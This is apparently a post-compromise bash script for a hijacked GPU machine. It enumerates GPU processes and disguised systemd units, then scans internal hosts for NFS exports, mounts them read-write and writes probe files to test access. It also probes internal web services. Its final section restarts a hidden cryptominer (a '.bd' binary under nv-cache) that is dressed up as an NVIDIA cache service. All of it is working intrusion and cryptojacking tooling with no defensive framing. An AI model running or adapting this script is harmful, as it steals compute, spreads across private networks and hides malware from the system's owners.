#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### START9 $(date -u +%FT%TZ)"
log "### GPUUSERS"
nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1 | head -12
for p in $(nvidia-smi --query-compute-apps=pid --format=csv,noheader 2>/dev/null | sort -u); do
  log "-- pid $p user=$(ps -o user= -p $p) start=$(ps -o lstart= -p $p)"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | cut -c1-300; echo
done
log "### UNITS-STATE"
for u in nv-cuda-cache.service nvidia-persistenced.service plh-card@0.service; do log "-- $u"; systemctl is-active $u 2>&1; done
ls -la /etc/systemd/system/ 2>/dev/null | grep -E 'nk-|plh|nv-' | head -20
log "### NFS"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  log "-- showmount $h"; timeout 10 showmount -e $h 2>&1 | head -8
  log "-- rpcinfo $h"; timeout 10 rpcinfo -p $h 2>&1 | grep -E 'nfs|mountd' | head -6
done
log "### NFS-MOUNT"
mkdir -p /mnt/ulnfs
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  for ex in "/" "/home" "/data" "/ssd" "/export" "/nfsshare" "/mnt" "/srv"; do
    d=/mnt/ulnfs/$(echo $h|tr . _)$(echo $ex|tr / _)
    mkdir -p $d
    if timeout 12 mount -t nfs -o rw,vers=3,nolock,soft,timeo=5 $h:$ex $d 2>/tmp/merr; then
      log "MOUNTED $h:$ex -> $d"; ls -la $d 2>&1 | head -12
      echo "probe-$(date +%s)" > $d/.ul_probe 2>&1 && log "WRITE-OK $d" || log "WRITE-FAIL $d"
      umount $d 2>/dev/null
    else log "mountfail $h:$ex $(head -1 /tmp/merr)"; fi
  done
done
log "### SVC20"
for p in 1900 1901 1907; do log "-- .20:$p"; timeout 6 curl -s -m 5 "http://192.168.0.20:$p/" | head -c 500; echo; done
log "-- .22:14998"; timeout 6 curl -s -m 5 "http://192.168.0.22:14998/" | head -c 400; echo
log "-- .22:18000"; timeout 6 curl -s -m 5 "http://192.168.0.22:18000/" | grep -oiE '<title>[^<]*' | head -3
log "### MINER-RESTORE"
if ! pgrep -f 'nv-cache/\.bd' >/dev/null; then
  log "no .bd running -> starting nv-cuda-cache"
  systemctl start nv-cuda-cache.service 2>&1; sleep 6
  log "state: $(systemctl is-active nv-cuda-cache.service)"
  head -20 /usr/local/lib/nv-cache/g.sh 2>/dev/null
  log "procs: $(pgrep -fc 'nv-cache/\.bd')"
fi
log "### DONE9 $(date -u +%FT%TZ)"
